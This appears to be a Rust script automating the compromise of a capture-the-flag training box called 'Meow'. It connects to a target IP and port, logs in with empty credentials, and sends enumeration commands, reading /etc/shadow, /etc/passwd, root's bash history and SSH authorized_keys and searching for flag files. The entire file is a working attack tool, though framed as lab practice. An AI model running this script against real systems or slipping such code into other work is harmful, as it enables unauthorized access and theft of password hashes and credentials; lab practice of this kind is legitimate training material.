use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::time::Duration;
use std::env;
use std::process;
use std::thread;

const FLAG_PATHS: [&str; 12] = [
    "/flag.txt",
    "/root/flag.txt",
    "/root/root.txt",
    "/home/user/flag.txt",
    "/home/user/user.txt",
    "/root/root.txt",
    "/root/root.txt.old",
    "/root/root.txt.bak",
    "/root/flag",
    "/root/root",
    "/root/user.txt",
    "/root/flag.txt.bak"
];

const ENUM_COMMANDS: [&str; 12] = [
    "whoami",
    "id",
    "uname -a",
    "pwd",
    "ls -la /",
    "ls -la /root",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "ps aux",
    "netstat -tuln",
    "ifconfig",
    "cat /proc/version"
];

const SEARCH_PATTERNS: [&str; 4] = [
    "*flag*",
    "*root*",
    "*user*",
    "*.txt"
];

fn execute_command(stream: &mut TcpStream, command: &str) -> io::Result<String> {
    stream.write_all(format!("{}\n", command).as_bytes())?;
    
    let mut buffer = vec![0; 4096]; // Increased buffer size
    let mut response = String::new();
    
    // Try to read multiple times to get complete response
    for _ in 0..3 {
        match stream.read(&mut buffer) {
            Ok(n) => {
                if n > 0 {
                    response.push_str(&String::from_utf8_lossy(&buffer[..n]));
                }
            },
            Err(e) => {
                if e.kind() == io::ErrorKind::WouldBlock {
                    thread::sleep(Duration::from_millis(100));
                    continue;
                }
                return Err(e);
            }
        }
    }
    
    Ok(response)
}

fn check_connection(stream: &mut TcpStream) -> bool {
    match execute_command(stream, "echo 'test'") {
        Ok(response) => response.contains("test"),
        Err(_) => false
    }
}

fn main() -> io::Result<()> {
    let args: Vec<String> = env::args().collect();
    
    if args.len() != 3 {
        println!("Usage: {} <target_ip> <port>", args[0]);
        process::exit(1);
    }
    
    let target = format!("{}:{}", args[1], args[2]);
    let timeout = Duration::from_secs(5);

    println!("[+] Starting Meow box automation...");
    println!("[+] Target: {}", target);
    
    let mut stream = match TcpStream::connect(&target) {
        Ok(stream) => {
            println!("[+] Connected successfully!");
            stream
        },
        Err(e) => {
            eprintln!("[-] Connection failed: {}", e);
            return Err(e);
        }
    };

    stream.set_read_timeout(Some(timeout))?;
    stream.set_write_timeout(Some(timeout))?;

    // Read banner
    let mut buffer = vec![0; 4096];
    match stream.read(&mut buffer) {
        Ok(n) => {
            if n > 0 {
                println!("[+] Banner received:");
                println!("{}", String::from_utf8_lossy(&buffer[..n]));
            }
        },
        Err(e) => eprintln!("[-] Error reading banner: {}", e),
    }

    // Attempt login
    println!("[+] Attempting login with empty credentials...");
    stream.write_all(b"\n")?;

    // Verify connection is still active
    if !check_connection(&mut stream) {
        eprintln!("[-] Connection lost after login attempt");
        return Err(io::Error::new(io::ErrorKind::ConnectionAborted, "Connection lost"));
    }

    // Basic system enumeration
    println!("\n[+] Starting system enumeration...");
    for cmd in ENUM_COMMANDS.iter() {
        println!("\n[+] Executing: {}", cmd);
        match execute_command(&mut stream, cmd) {
            Ok(response) => {
                if !response.is_empty() {
                    println!("{}", response);
                }
            },
            Err(e) => eprintln!("[-] Error executing command: {}", e),
        }
    }

    // Search for flags
    println!("\n[+] Searching for flags...");
    for path in FLAG_PATHS.iter() {
        println!("\n[+] Checking: {}", path);
        match execute_command(&mut stream, &format!("cat {}", path)) {
            Ok(response) => {
                if !response.is_empty() {
                    println!("[+] Potential flag found in {}:", path);
                    println!("{}", response);
                }
            },
            Err(e) => eprintln!("[-] Error reading file: {}", e),
        }
    }

    // Additional enumeration
    println!("\n[+] Additional enumeration...");
    for pattern in SEARCH_PATTERNS.iter() {
        let cmd = format!("find / -type f -name '{}' 2>/dev/null", pattern);
        println!("\n[+] Executing: {}", cmd);
        match execute_command(&mut stream, &cmd) {
            Ok(response) => {
                if !response.is_empty() {
                    println!("[+] Files found matching pattern '{}':", pattern);
                    println!("{}", response);
                }
            },
            Err(e) => eprintln!("[-] Error executing command: {}", e),
        }
    }

    // Check for interesting files
    println!("\n[+] Checking for interesting files...");
    let interesting_paths = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/issue",
        "/etc/motd",
        "/root/.bash_history",
        "/root/.ssh/authorized_keys"
    ];

    for path in interesting_paths.iter() {
        println!("\n[+] Checking: {}", path);
        match execute_command(&mut stream, &format!("cat {}", path)) {
            Ok(response) => {
                if !response.is_empty() {
                    println!("[+] Contents of {}:", path);
                    println!("{}", response);
                }
            },
            Err(e) => eprintln!("[-] Error reading file: {}", e),
        }
    }

    println!("\n[+] Automation complete!");
    Ok(())
} 